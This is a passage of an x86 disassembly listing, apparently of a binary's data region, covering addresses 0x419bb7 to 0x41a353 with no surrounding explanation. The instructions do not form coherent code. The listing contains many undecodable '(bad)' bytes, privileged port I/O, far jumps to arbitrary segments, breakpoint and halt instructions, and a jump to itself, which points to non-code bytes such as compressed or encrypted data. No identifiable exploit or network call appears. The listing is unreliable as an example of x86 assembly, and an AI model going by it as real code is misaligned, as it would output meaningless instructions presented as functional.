  419bb7:	pop    esp
  419bb8:	les    esi,FWORD PTR [esi+0x4c]
  419bbb:	sub    DWORD PTR [ecx],0xe5449365
  419bc1:	sbb    al,0x58
  419bc3:	pop    es
  419bc4:	inc    edx
  419bc5:	cmp    eax,0x9c4206e8
  419bca:	cld    
  419bcb:	test   al,0x92
  419bcd:	loop   0x419be1
  419bcf:	dec    esi
  419bd0:	lock sub dl,al
  419bd3:	mov    bl,0x66
  419bd5:	test   DWORD PTR [esi+eax*8-0x32019c82],ebp
  419bdc:	arpl   sp,sp
  419bde:	lods   eax,DWORD PTR ds:[esi]
  419bdf:	lea    eax,[esi-0x32]
  419be2:	mov    edx,0x3a48e3c9
  419be7:	aam    0x2d
  419be9:	loope  0x419c04
  419beb:	cld    
  419bec:	push   esp
  419bed:	jne    0x419ba5
  419bef:	and    esp,DWORD PTR [ebx-0x55fdce04]
  419bf5:	scas   eax,DWORD PTR es:[edi]
  419bf6:	pop    esp
  419bf7:	sub    al,ah
  419bf9:	fistp  WORD PTR [eax-0x41c0a709]
  419bff:	scas   al,BYTE PTR es:[edi]
  419c00:	in     eax,0xbc
  419c02:	xor    DWORD PTR ds:0x80e10d75,esp
  419c08:	test   BYTE PTR [ecx+0x5c],al
  419c0b:	cwde   
  419c0c:	out    dx,eax
  419c0d:	sbb    esp,DWORD PTR [ecx-0x3c]
  419c10:	call   0xc78:0xec8719b7
  419c17:	add    dl,BYTE PTR [eax+0x5f]
  419c1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c1b:	mov    bl,0x35
  419c1d:	dec    ebx
  419c1e:	xchg   DWORD PTR [edi+0x27cabda6],esi
  419c24:	push   cs
  419c25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c26:	jno    0x419bde
  419c28:	test   al,0x44
  419c2a:	pop    dx
  419c2c:	jle    0x419bba
  419c2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c2f:	ss ds es aaa 
  419c33:	dec    esi
  419c34:	or     edx,DWORD PTR [edi+ecx*2+0x5c]
  419c38:	xor    eax,0xe3bebe82
  419c3d:	ror    DWORD PTR [ebx],0xbf
  419c40:	lods   al,BYTE PTR ds:[esi]
  419c41:	add    al,0x18
  419c43:	pop    edi
  419c44:	mov    ah,0x9f
  419c46:	lods   eax,DWORD PTR ds:[esi]
  419c47:	mov    ecx,0x6468a19
  419c4c:	loop   0x419c8e
  419c4e:	test   DWORD PTR [ecx+0x25c1dcd2],ebx
  419c54:	xchg   DWORD PTR [ebp+0x4],ebp
  419c57:	jb     0x419cd5
  419c59:	xchg   ebp,eax
  419c5a:	jp     0x419bf3
  419c5c:	mov    ah,0x82
  419c5e:	push   eax
  419c5f:	adc    DWORD PTR [esi],ebx
  419c61:	test   BYTE PTR [ebp+0x38],al
  419c64:	jmp    0x33ea:0x82457a34
  419c6b:	loope  0x419ce4
  419c6d:	gs js  0x419cc7
  419c70:	mov    ch,0xfc
  419c72:	test   BYTE PTR [edx],0xa8
  419c75:	pop    ebp
  419c76:	shl    dl,0xd6
  419c79:	int    0x6a
  419c7b:	push   es
  419c7c:	(bad)  
  419c7d:	inc    esi
  419c7f:	sbb    bh,dl
  419c81:	ss mov ch,0x1
  419c84:	inc    esp
  419c85:	dec    ecx
  419c86:	shl    esp,0x66
  419c89:	ffreep st(3)
  419c8b:	(bad)  
  419c8c:	icebp  
  419c8d:	int    0xbf
  419c8f:	dec    esi
  419c90:	int    0x26
  419c92:	lock or al,al
  419c95:	jne    0x419c8b
  419c97:	shl    DWORD PTR [esi-0x19],0x2b
  419c9b:	test   al,0x0
  419c9d:	sub    ax,0xd36
  419ca1:	ret    
  419ca2:	(bad)  
  419ca3:	pop    ebx
  419ca4:	and    DWORD PTR [ebp-0x50c82b9c],ebp
  419caa:	xor    BYTE PTR [ebx-0x74],dl
  419cad:	or     DWORD PTR [edx],0x4f2e9e67
  419cb3:	loop   0x419c6e
  419cb5:	add    BYTE PTR [ecx],ch
  419cb7:	inc    esp
  419cb8:	rcl    BYTE PTR [ebp+0x29956f41],0xfe
  419cbf:	mov    eax,ds:0x91559f7d
  419cc4:	inc    edx
  419cc5:	cld    
  419cc6:	cmp    esi,ecx
  419cc8:	mov    dh,0x4d
  419cca:	outs   dx,DWORD PTR ds:[esi]
  419ccb:	test   DWORD PTR [ecx],ebp
  419ccd:	push   ds
  419cce:	(bad)  
  419cd0:	inc    ebx
  419cd1:	jmp    0x419c7a
  419cd3:	clc    
  419cd4:	xchg   dh,al
  419cd6:	out    dx,al
  419cd7:	fadd   QWORD PTR [ebp+0x4ebd141d]
  419cdd:	jmp    0x419d3a
  419cdf:	sub    eax,0xde3dcf71
  419ce4:	jne    0x419d26
  419ce6:	dec    ebp
  419ce7:	iret   
  419ce8:	cdq    
  419ce9:	jns    0x419d57
  419ceb:	jne    0x419c98
  419ced:	xchg   esp,eax
  419cee:	mov    WORD PTR [edi-0x498f77a1],ss
  419cf4:	jae    0x419cea
  419cf6:	sub    al,cl
  419cf8:	sbb    ah,BYTE PTR [edx+0x205d422]
  419cfe:	popf   
  419cff:	mov    dl,0xc9
  419d01:	and    BYTE PTR [ebx],0x5
  419d04:	ja     0x419d68
  419d06:	mov    ah,0x7
  419d08:	and    WORD PTR [edi+ebx*8+0x65d104ca],dx
  419d10:	mov    eax,0x8e1167a0
  419d15:	xchg   edi,eax
  419d16:	mov    ds:0x609e0330,al
  419d1b:	repnz test DWORD PTR ss:[edx+0x3e],ebp
  419d20:	add    edi,DWORD PTR [ecx+0x6dd9c49f]
  419d26:	jbe    0x419d17
  419d28:	add    eax,0xd61fe0e8
  419d2d:	out    dx,eax
  419d2e:	and    DWORD PTR [ebx-0x35a25766],esi
  419d34:	shl    eax,0x76
  419d37:	mov    ds:0xe04a1d3c,al
  419d3c:	push   esi
  419d3d:	into   
  419d3e:	jge    0x419d86
  419d40:	mov    ebp,0x69a9d7e7
  419d45:	sbb    BYTE PTR [ebx+0x35],dl
  419d48:	or     edx,DWORD PTR [esi+0x69]
  419d4b:	test   DWORD PTR [eax],eax
  419d4d:	cwde   
  419d4e:	fcomp  QWORD PTR [ecx-0x1c092640]
  419d54:	pop    edx
  419d55:	add    al,0x59
  419d57:	adc    BYTE PTR [esi],ch
  419d59:	pop    ds
  419d5a:	xor    bl,dh
  419d5c:	sub    BYTE PTR [ecx],bh
  419d5e:	fs xchg esp,eax
  419d60:	arpl   WORD PTR [ecx+ebx*4],cx
  419d63:	push   es
  419d64:	sbb    dh,BYTE PTR [eax+0x63]
  419d67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d68:	push   ds
  419d69:	push   ebx
  419d6a:	neg    DWORD PTR [ebp-0x624421f8]
  419d70:	and    BYTE PTR [esi+0x24],0x60
  419d74:	xchg   esp,eax
  419d75:	sub    eax,0x9e3558e7
  419d7a:	dec    ebx
  419d7b:	(bad)  
  419d7c:	or     al,0x7a
  419d7e:	or     al,0x37
  419d80:	xor    al,0x42
  419d82:	push   esp
  419d83:	inc    ecx
  419d84:	sub    dh,BYTE PTR [edx]
  419d86:	lahf   
  419d87:	jle    0x419df9
  419d89:	push   esp
  419d8a:	fwait
  419d8b:	jo     0x419d41
  419d8d:	clc    
  419d8e:	add    ecx,esi
  419d90:	and    al,0xf8
  419d92:	pop    edx
  419d93:	stos   DWORD PTR es:[edi],eax
  419d94:	stos   DWORD PTR es:[edi],eax
  419d95:	retf   0x896a
  419d98:	into   
  419d99:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d9b:	and    DWORD PTR [ecx-0x2624e8f3],edi
  419da1:	jbe    0x419d31
  419da3:	les    ebp,FWORD PTR [ebx]
  419da5:	push   ebp
  419da6:	adc    DWORD PTR [ecx-0x177bb763],edi
  419dac:	pop    ebp
  419dad:	dec    esp
  419dae:	xor    eax,0x757dae82
  419db3:	arpl   dx,bp
  419db5:	sbb    eax,0x22350dbc
  419dba:	ds stos BYTE PTR es:[edi],al
  419dbc:	clc    
  419dbd:	inc    esp
  419dbe:	or     ch,BYTE PTR [ebx+0x762aa454]
  419dc4:	inc    esp
  419dc5:	dec    ecx
  419dc6:	mov    ds:0xafa065b5,eax
  419dcb:	sub    bh,BYTE PTR [esi-0x46]
  419dce:	sub    bh,BYTE PTR [esi-0x6ff3d8f0]
  419dd4:	fistp  DWORD PTR [edi-0x4c]
  419dd7:	fwait
  419dd8:	add    ebp,ecx
  419dda:	jge    0x419db2
  419ddc:	or     eax,0x55c21408
  419de1:	fwait
  419de2:	mov    ebp,0x3d9721e2
  419de7:	mov    eax,ds:0xb8cffedb
  419dec:	inc    BYTE PTR [esi]
  419dee:	xor    eax,0xb8d603a8
  419df3:	and    eax,0x37561891
  419df8:	jge    0x419e22
  419dfa:	mov    al,0xee
  419dfc:	sub    eax,0x2c074600
  419e01:	and    edi,ebx
  419e03:	pusha  
  419e04:	pop    esi
  419e05:	mov    ebx,0xe0cf1ba7
  419e0a:	test   DWORD PTR [ebp+0xc5f32ad],ebx
  419e10:	in     al,dx
  419e11:	mov    edi,0x1ff1d943
  419e16:	mov    esi,0x7e0c579f
  419e1b:	jmp    edx
  419e1d:	data16 jecxz 0x419e10
  419e20:	out    0xf7,eax
  419e22:	ret    
  419e23:	jg     0x419e38
  419e25:	stos   BYTE PTR es:[edi],al
  419e26:	rol    BYTE PTR [ebp-0x21],1
  419e29:	lea    esp,[ecx]
  419e2b:	les    edi,FWORD PTR [edx+ecx*1-0x3]
  419e2f:	jmp    0xbb46c84d
  419e34:	(bad)  
  419e35:	(bad)  
  419e36:	in     al,0x7e
  419e38:	push   ecx
  419e39:	dec    esi
  419e3a:	gs out dx,eax
  419e3c:	xchg   edi,eax
  419e3d:	and    DWORD PTR [esi+0x28],0xfffffff8
  419e41:	lahf   
  419e42:	ds push edi
  419e44:	scas   al,BYTE PTR es:[edi]
  419e45:	dec    ebx
  419e46:	or     al,0x52
  419e48:	sbb    eax,0x8c585b64
  419e4d:	repz jle 0x419de3
  419e50:	and    BYTE PTR [edi],ch
  419e52:	push   ebp
  419e53:	ret    
  419e54:	jge    0x419df1
  419e56:	pop    edx
  419e57:	adc    al,0xd3
  419e59:	cli    
  419e5a:	pop    ds
  419e5b:	sbb    edi,DWORD PTR [esp+edx*1]
  419e5e:	cli    
  419e5f:	imul   eax,DWORD PTR [ecx+0x63],0xffffffde
  419e63:	cdq    
  419e64:	lock mov dl,0x20
  419e67:	push   cs
  419e68:	jg     0x419e8c
  419e6a:	pop    es
  419e6b:	int    0x7
  419e6d:	mov    ecx,DWORD PTR [edi-0x642dedcd]
  419e73:	mov    ah,0xc4
  419e75:	call   0xc398:0xddd367cf
  419e7c:	ds dec ecx
  419e7e:	dec    esi
  419e7f:	cmp    eax,0x45f17c8f
  419e84:	test   BYTE PTR [ecx],ch
  419e86:	sbb    ah,0xe1
  419e89:	and    bh,cl
  419e8b:	mov    dl,BYTE PTR [ecx+0x17cdc146]
  419e91:	aaa    
  419e92:	inc    esp
  419e93:	loopne 0x419e18
  419e95:	addr16 jae 0x419ea1
  419e98:	cmc    
  419e99:	shl    BYTE PTR [edi-0x6c8ec19a],cl
  419e9f:	(bad)  
  419ea0:	repz push cs
  419ea2:	enter  0xe9aa,0x7a
  419ea6:	jmp    0x4c2a17df
  419eab:	out    0xfd,eax
  419ead:	pop    esi
  419eae:	add    al,0x69
  419eb0:	arpl   WORD PTR [eax+edx*1],dx
  419eb3:	addr16 push ds
  419eb5:	xchg   ebx,eax
  419eb6:	lods   eax,DWORD PTR ds:[esi]
  419eb7:	fcmovne st,st(6)
  419eb9:	shr    BYTE PTR [eax-0x6ad198a0],cl
  419ebf:	inc    eax
  419ec0:	add    BYTE PTR [edx+0x58677e67],0xfe
  419ec7:	mov    ds:0xe8f16b75,eax
  419ecc:	es mov ecx,edx
  419ecf:	jg     0x419f08
  419ed1:	mov    cs,WORD PTR [ecx+0x1faee237]
  419ed7:	imul   edi,DWORD PTR [ecx],0x4e190067
  419edd:	mov    ?,WORD PTR [edx-0x77]
  419ee0:	xor    ah,al
  419ee2:	push   esi
  419ee3:	pop    edx
  419ee4:	int3   
  419ee5:	sbb    esi,esi
  419ee7:	xor    eax,0x6f1cd8f2
  419eec:	jbe    0x419f27
  419eee:	inc    ebx
  419eef:	and    BYTE PTR [edi],0x92
  419ef2:	cwde   
  419ef3:	jmp    0x519b:0x217f6ce1
  419efa:	xchg   BYTE PTR [edi],bl
  419efc:	xor    al,0xf2
  419efe:	cmp    BYTE PTR [ecx+ecx*2+0x1a],cl
  419f02:	inc    BYTE PTR [esp+edi*8]
  419f05:	xor    eax,0x9d3d9f58
  419f0a:	je     0x419f1a
  419f0c:	or     eax,0x1183dd6b
  419f11:	mov    ds,WORD PTR [ebp-0x6845a163]
  419f17:	pop    esi
  419f18:	mov    esi,0xd6db8392
  419f1d:	jp     0x419f75
  419f1f:	jl     0x419ec2
  419f21:	scas   al,BYTE PTR es:[edi]
  419f22:	pop    ds
  419f23:	push   esp
  419f24:	xor    al,0xc4
  419f26:	and    al,0xaf
  419f28:	sbb    bx,ax
  419f2b:	lock mov ds:0x6ccd7b97,eax
  419f31:	scas   al,BYTE PTR es:[edi]
  419f32:	mov    edx,0x5479a7c8
  419f37:	jle    0x419f5a
  419f39:	je     0x419fa8
  419f3b:	in     eax,dx
  419f3c:	dec    ecx
  419f3d:	sbb    al,0xb9
  419f3f:	adc    eax,0x44e2c9d
  419f44:	loop   0x419ed4
  419f46:	cmp    BYTE PTR [edx+0x12],0xf6
  419f4a:	push   ss
  419f4b:	xchg   cl,dl
  419f4d:	std    
  419f4e:	add    ah,BYTE PTR [ebp-0x3f]
  419f51:	adc    ecx,DWORD PTR [ecx+ebx*8-0x39]
  419f55:	ja     0x419ed9
  419f57:	out    0xc7,al
  419f59:	push   ds
  419f5a:	sahf   
  419f5b:	push   0x65ff441f
  419f60:	retf   
  419f61:	push   eax
  419f62:	out    dx,al
  419f63:	xor    esi,esi
  419f65:	push   cs
  419f66:	fdivr  DWORD PTR [edi-0x5251f4d7]
  419f6c:	sbb    al,0x26
  419f6f:	pop    esi
  419f70:	shl    DWORD PTR [eax],1
  419f72:	jbe    0x419ef9
  419f74:	ins    BYTE PTR es:[edi],dx
  419f75:	and    al,0xcd
  419f77:	std    
  419f78:	mov    esi,0x52c5da35
  419f7d:	js     0x419ffd
  419f7f:	dec    ebx
  419f80:	mov    ecx,0xe8f94f04
  419f85:	jo     0x419f69
  419f87:	mov    al,0x9c
  419f89:	ret    
  419f8a:	int    0xc0
  419f8c:	stos   DWORD PTR es:[edi],eax
  419f8d:	in     al,dx
  419f8e:	(bad)  
  419f8f:	cwde   
  419f90:	fiadd  DWORD PTR [eax]
  419f92:	inc    ebp
  419f93:	jno    0x419ffe
  419f95:	scas   al,BYTE PTR es:[edi]
  419f96:	add    BYTE PTR [ebx],bl
  419f98:	push   es
  419f99:	xor    al,0x60
  419f9b:	adc    DWORD PTR [edi],edx
  419f9d:	cmp    eax,0x5ed33ee1
  419fa2:	push   esi
  419fa3:	push   DWORD PTR [edx]
  419fa5:	jecxz  0x419f3a
  419fa7:	ffree  st(0)
  419fa9:	dec    ebp
  419faa:	or     BYTE PTR [edx],0xbc
  419fad:	push   ecx
  419fae:	(bad)  
  419fb0:	dec    ebx
  419fb1:	xchg   edx,eax
  419fb2:	arpl   dx,cx
  419fb4:	inc    ebp
  419fb5:	or     BYTE PTR [esi],bl
  419fb7:	mov    ds:0x61e1c65d,eax
  419fbc:	in     eax,0x62
  419fbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fbf:	dec    edx
  419fc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fc1:	in     al,dx
  419fc2:	aam    0x56
  419fc4:	loopne 0x41a01d
  419fc6:	lods   eax,DWORD PTR ds:[esi]
  419fc7:	scas   al,BYTE PTR es:[edi]
  419fc8:	sub    BYTE PTR [edx+eax*4-0x6b],cl
  419fcc:	jp     0x419fe9
  419fce:	jmp    0x419f81
  419fd0:	mov    al,0xed
  419fd2:	scas   al,BYTE PTR es:[edi]
  419fd3:	and    BYTE PTR [edx-0xb],al
  419fd6:	out    0xee,al
  419fd8:	inc    edx
  419fd9:	xchg   esp,eax
  419fda:	arpl   bp,di
  419fdc:	inc    edx
  419fdd:	xchg   esp,eax
  419fde:	cmc    
  419fdf:	xchg   DWORD PTR [eax],edi
  419fe1:	push   eax
  419fe2:	xor    eax,0xf4ee7058
  419fe7:	and    BYTE PTR [ebp+0x20],ah
  419fea:	or     al,0xaa
  419fec:	mov    ebx,0xf06a4d4f
  419ff1:	push   ss
  419ff2:	nop
  419ff3:	sub    BYTE PTR [ebp+edi*1+0x32],0x7f
  419ff8:	adc    eax,0x14046f2
  419ffd:	pop    es
  419ffe:	fwait
  419fff:	dec    eax
  41a000:	cdq    
  41a001:	aad    0x9c
  41a003:	cmp    eax,0x5d0d2d37
  41a008:	cmp    BYTE PTR [ebp-0x6b],dh
  41a00b:	mov    esp,0x112493e9
  41a010:	loop   0x419fa7
  41a012:	push   edi
  41a013:	mov    bh,0xb5
  41a015:	cmp    ecx,DWORD PTR [ecx]
  41a017:	mov    edi,0xeb26b912
  41a01c:	mov    eax,ds:0xc38781c2
  41a021:	(bad)  
  41a025:	jmp    0x419ff8
  41a027:	xor    BYTE PTR [ecx],cl
  41a029:	push   ss
  41a02a:	xchg   edx,eax
  41a02b:	xchg   DWORD PTR ds:0xc11e7985,esp
  41a031:	retf   0x67b9
  41a034:	push   es
  41a035:	mov    ebx,0x88e64fb8
  41a03a:	mov    ebp,0xbc84e5f0
  41a03f:	mov    DWORD PTR [edx-0x21],ecx
  41a042:	add    BYTE PTR [ebp-0x50],0xf9
  41a046:	xor    bh,bl
  41a048:	jmp    0x437eb44c
  41a04d:	inc    ecx
  41a04e:	scas   al,BYTE PTR es:[edi]
  41a04f:	lods   eax,DWORD PTR ds:[esi]
  41a050:	xor    eax,0x48261db0
  41a055:	inc    ebp
  41a056:	adc    esp,DWORD PTR [esi-0x66]
  41a059:	sbb    DWORD PTR [esi],ecx
  41a05b:	inc    esp
  41a05c:	out    dx,eax
  41a05d:	lea    esi,[edx-0x323642f6]
  41a063:	mov    eax,ds:0xc47d7403
  41a068:	add    DWORD PTR [ecx],ebp
  41a06a:	sbb    bl,BYTE PTR [eax]
  41a06c:	xor    eax,0xac40bb19
  41a071:	pop    ecx
  41a072:	pushf  
  41a073:	in     al,dx
  41a074:	ret    
  41a075:	cmp    BYTE PTR [ebx],ch
  41a077:	add    eax,DWORD PTR [edx+0x9315c46]
  41a07d:	jmp    0x41a0b1
  41a07f:	and    BYTE PTR [edi+ebp*1-0x509325c],bh
  41a086:	mov    esp,0x63daa9d5
  41a08b:	jns    0x41a107
  41a08d:	mov    ebp,0xe6ea58df
  41a092:	repz pop ebx
  41a094:	sbb    bh,BYTE PTR [ecx]
  41a096:	div    al
  41a098:	jno    0x41a0bc
  41a09a:	leave  
  41a09b:	sar    DWORD PTR [edi],cl
  41a09d:	pop    ebx
  41a09e:	and    BYTE PTR ds:0x9a503765,bl
  41a0a4:	adc    eax,0x3fa3f63d
  41a0a9:	xor    cl,BYTE PTR [edx+0x3ba20a4a]
  41a0af:	cmp    BYTE PTR [bx+di],dh
  41a0b2:	mov    cl,BYTE PTR [eax+ebx*8]
  41a0b5:	pop    esp
  41a0b6:	mov    ch,0x89
  41a0b8:	push   eax
  41a0b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0ba:	dec    ebx
  41a0bb:	mov    ah,0xd9
  41a0bd:	enter  0x97c5,0xde
  41a0c1:	cmp    DWORD PTR [ebx+0x30],eax
  41a0c4:	add    al,0xe6
  41a0c6:	mov    esi,0x284707ad
  41a0cb:	(bad)  [edi]
  41a0cd:	and    DWORD PTR [ebx-0x1a5d176d],esi
  41a0d3:	shr    DWORD PTR [esi],cl
  41a0d5:	xlat   BYTE PTR ds:[ebx]
  41a0d6:	in     eax,0x11
  41a0d8:	dec    ecx
  41a0d9:	jno    0x41a09b
  41a0db:	and    eax,0x70ab094d
  41a0e0:	jp     0x41a08d
  41a0e2:	repz jge 0x41a13a
  41a0e5:	push   eax
  41a0e6:	shl    ch,0xcf
  41a0e9:	or     BYTE PTR [ebx+edi*4-0x74],0x4b
  41a0ee:	mov    eax,fs:0xc33c3ce0
  41a0f4:	retf   0xfe1b
  41a0f7:	popa   
  41a0f8:	adc    dh,BYTE PTR [edi+0xae0cb5a]
  41a0fe:	push   cs
  41a0ff:	jle    0x41a164
  41a101:	icebp  
  41a102:	out    0xcd,eax
  41a104:	xchg   BYTE PTR [edx+0x51],dh
  41a107:	inc    edi
  41a108:	cmp    DWORD PTR [ebx-0x6a],ebp
  41a10b:	and    al,0xe5
  41a10d:	fwait
  41a10e:	xchg   ebp,eax
  41a10f:	lea    edx,[esi]
  41a111:	add    eax,0xd0403772
  41a116:	imul   edi,DWORD PTR [edx],0xffffffe6
  41a119:	xchg   edx,eax
  41a11a:	mov    eax,0x3107cd6c
  41a11f:	sbb    DWORD PTR [esi-0x37],esp
  41a122:	pop    ds
  41a123:	push   0x4c
  41a125:	cmp    al,0xef
  41a127:	cmp    eax,0xea36de47
  41a12c:	in     eax,dx
  41a12d:	and    esp,ebx
  41a12f:	(bad)  
  41a130:	mov    ebx,0xcc41a87a
  41a135:	test   al,0xaa
  41a137:	push   0x8764c68e
  41a13c:	lahf   
  41a13d:	cwde   
  41a13e:	xchg   edx,eax
  41a13f:	and    eax,0xf53bff8a
  41a144:	and    eax,0x4b06413a
  41a149:	xchg   ecx,eax
  41a14a:	fimul  DWORD PTR [ebx-0x6c]
  41a14d:	or     DWORD PTR [esi],edi
  41a14f:	inc    ecx
  41a150:	inc    eax
  41a151:	pushf  
  41a152:	mov    ecx,0x5df1c061
  41a157:	jno    0x41a0f8
  41a159:	dec    ecx
  41a15a:	add    ah,al
  41a15c:	sbb    al,0x1f
  41a15e:	out    0x83,eax
  41a160:	mov    bh,0xe6
  41a162:	fiadd  DWORD PTR [ecx+0x59]
  41a165:	xchg   ecx,eax
  41a166:	mov    bl,BYTE PTR [ecx-0x6f16ecb8]
  41a16c:	and    al,0x9a
  41a16e:	jmp    0x41a137
  41a170:	cmp    BYTE PTR [esi+0x1f562234],ch
  41a176:	(bad)
  41a179:	push   eax
  41a17a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a17b:	adc    DWORD PTR [eax],0x2c7103f0
  41a181:	fldenv [bx-0xeb3]
  41a186:	sub    al,0x52
  41a188:	ror    DWORD PTR [eax+eiz*4],0x6d
  41a18c:	sar    DWORD PTR [eax],cl
  41a18e:	test   DWORD PTR [esi-0x68],esp
  41a191:	sub    al,0x9
  41a193:	fcmovu st,st(1)
  41a195:	push   ss
  41a196:	jo     0x41a1e4
  41a198:	mov    BYTE PTR [ecx-0x64e10bc3],ch
  41a19e:	mov    esi,0x2a1b686a
  41a1a3:	xchg   BYTE PTR [ebx],bl
  41a1a5:	cmp    ah,BYTE PTR [eax+eiz*2+0x4f]
  41a1a9:	adc    al,BYTE PTR [esi+eax*1]
  41a1ac:	stos   BYTE PTR es:[edi],al
  41a1ad:	xor    al,0xb7
  41a1af:	jge    0x41a202
  41a1b1:	jbe    0x41a1e1
  41a1b3:	inc    ebx
  41a1b4:	mov    esp,0x8a175318
  41a1b9:	icebp  
  41a1ba:	pop    ebx
  41a1bb:	or     DWORD PTR [ebx-0x30],ecx
  41a1be:	div    ch
  41a1c0:	push   ds
  41a1c1:	and    BYTE PTR [ecx],dl
  41a1c3:	fsubr  QWORD PTR [eax+ecx*8-0x55666d6e]
  41a1ca:	sbb    eax,0xeed6dc95
  41a1cf:	add    esi,DWORD PTR [edx-0x70]
  41a1d2:	and    eax,0xa1db0c1
  41a1d7:	mov    edi,0xe957f13
  41a1dc:	or     eax,esi
  41a1de:	mov    bh,0xf8
  41a1e0:	ret    
  41a1e1:	jnp    0x41a24e
  41a1e3:	fst    DWORD PTR [eax+esi*1]
  41a1e6:	xchg   edx,eax
  41a1e7:	adc    ebx,edx
  41a1e9:	pop    ds
  41a1ea:	mov    dl,0x58
  41a1ec:	push   es
  41a1ed:	rol    dh,1
  41a1ef:	xor    DWORD PTR [edi+0x27],ebx
  41a1f2:	iret   
  41a1f3:	xchg   edx,eax
  41a1f4:	mov    cs,WORD PTR [edi-0x5a]
  41a1f7:	sbb    eax,0x11ae1d34
  41a1fc:	or     al,0xfd
  41a1fe:	pushw  0x98b5
  41a202:	nop
  41a203:	cwde   
  41a204:	arpl   WORD PTR [eax+0x4ad9b16e],sp
  41a20a:	out    dx,al
  41a20b:	sbb    eax,0x60da517
  41a210:	retf   0x541f
  41a213:	std    
  41a214:	bound  edi,QWORD PTR [ecx+0x1cc2a9fe]
  41a21a:	imul   ecx,DWORD PTR [edi+0xd6bd83c],0x34
  41a221:	div    ah
  41a223:	pop    ebp
  41a224:	sub    eax,0x37dd1ced
  41a229:	pop    ss
  41a22a:	adc    esi,DWORD PTR [ebp-0x47]
  41a22d:	mov    dl,0x8b
  41a22f:	pop    ecx
  41a230:	cmp    cl,BYTE PTR [ecx+esi*8+0x3a]
  41a234:	int3   
  41a235:	pusha  
  41a236:	sub    bh,al
  41a238:	pop    ebp
  41a239:	neg    BYTE PTR [eax+0x4a]
  41a23c:	es mov esi,0xc2edb48d
  41a242:	xchg   edx,eax
  41a243:	repz pop esp
  41a245:	mov    esp,0xf53ba231
  41a24a:	jmp    0x41a2c1
  41a24c:	sahf   
  41a24d:	rcr    bl,1
  41a24f:	ins    DWORD PTR es:[edi],dx
  41a250:	or     BYTE PTR [ebx+0x2ede7cc6],bl
  41a256:	inc    esi
  41a257:	inc    ebx
  41a258:	dec    esi
  41a259:	mov    esp,0x2c440683
  41a25e:	mov    ah,0xc
  41a260:	test   DWORD PTR [ebp+0x5ca5e2e9],eax
  41a266:	call   0xdafbbbf7
  41a26b:	jbe    0x41a2b2
  41a26d:	pop    eax
  41a26e:	leave  
  41a26f:	push   0x6e1a004b
  41a274:	mov    ah,0x19
  41a276:	mov    dh,0x33
  41a278:	(bad)
  41a27b:	pop    edx
  41a27c:	stos   BYTE PTR es:[edi],al
  41a27d:	pop    ebp
  41a27e:	inc    esi
  41a27f:	dec    ebp
  41a280:	rcl    al,0x68
  41a283:	aam    0x5f
  41a285:	pop    ebp
  41a286:	retf   
  41a287:	loope  0x41a2f3
  41a289:	aas    
  41a28a:	shr    BYTE PTR [edx+0x2],1
  41a28d:	xor    al,0x10
  41a28f:	sti    
  41a290:	ins    BYTE PTR es:[edi],dx
  41a291:	xchg   edi,eax
  41a292:	cmp    al,0x97
  41a294:	fs dec ebx
  41a296:	push   cs
  41a297:	jae    0x41a238
  41a299:	dec    ebp
  41a29a:	call   0x1ef2:0xbc93e59a
  41a2a1:	loope  0x41a2f5
  41a2a3:	neg    BYTE PTR [ecx-0x1b]
  41a2a6:	and    esp,DWORD PTR [edi+0x682febfd]
  41a2ac:	xchg   ecx,eax
  41a2ad:	ins    DWORD PTR es:[edi],dx
  41a2ae:	(bad)  
  41a2b0:	cmp    eax,0x910095bd
  41a2b5:	xchg   ebp,eax
  41a2b6:	xor    DWORD PTR [ebp-0x1d54fea1],edi
  41a2bc:	mov    esp,0x9d940895
  41a2c1:	cdq    
  41a2c2:	mov    dh,0xc0
  41a2c4:	xor    al,0x85
  41a2c6:	mov    ds:0xb600bad0,al
  41a2cb:	or     BYTE PTR [eax],ah
  41a2cd:	cs pop edi
  41a2cf:	xor    edx,DWORD PTR [esi-0x1ea3008]
  41a2d5:	ret    0xa743
  41a2d8:	gs jns 0x41a2c1
  41a2db:	jns    0x41a346
  41a2dd:	aad    0x35
  41a2df:	jmp    0x247f:0xef4d6982
  41a2e6:	xor    DWORD PTR [edi-0x14],ebp
  41a2e9:	pop    ebp
  41a2ea:	inc    edx
  41a2eb:	pop    esi
  41a2ec:	popf   
  41a2ed:	xor    bl,al
  41a2ef:	sub    DWORD PTR [ecx],0x45
  41a2f2:	bound  ebx,QWORD PTR [ebp-0x3a]
  41a2f5:	cld    
  41a2f6:	cmp    edx,ebp
  41a2f8:	loope  0x41a27b
  41a2fa:	jno    0x41a2b6
  41a2fc:	dec    esp
  41a2fd:	loope  0x41a286
  41a2ff:	adc    cl,0x4e
  41a302:	sbb    BYTE PTR [ebx-0x20984ed0],ah
  41a308:	out    dx,al
  41a309:	daa    
  41a30a:	mov    ds:0xa6c592f8,eax
  41a30f:	push   ebp
  41a310:	std    
  41a311:	inc    ebp
  41a312:	pop    ss
  41a313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a314:	clc    
  41a315:	adc    DWORD PTR [esi],esi
  41a317:	ja     0x41a372
  41a319:	mov    edx,0xe846fc54
  41a31e:	adc    DWORD PTR [edx+0x63],esi
  41a321:	mov    esi,0x5f869f38
  41a326:	pop    ebx
  41a327:	jge    0x41a311
  41a329:	shl    DWORD PTR ds:[eax],0x9c
  41a32d:	lock hlt 
  41a32f:	mov    ebx,0xa9da657
  41a334:	cmc    
  41a335:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a336:	icebp  
  41a337:	add    eax,0x10a1447a
  41a33c:	xor    ah,BYTE PTR [eax]
  41a33e:	sar    ecx,1
  41a340:	pusha  
  41a341:	push   0xfadf4fc7
  41a346:	lods   al,BYTE PTR ds:[esi]
  41a347:	lods   al,BYTE PTR ds:[esi]
  41a348:	xchg   edi,eax
  41a349:	jmp    0x41a349
  41a34b:	mov    DWORD PTR [edx-0x1b6fe9ae],edi
  41a351:	je     0x41a2ec
  41a353:	lea    eax,[ecx+0x5cf176b2]
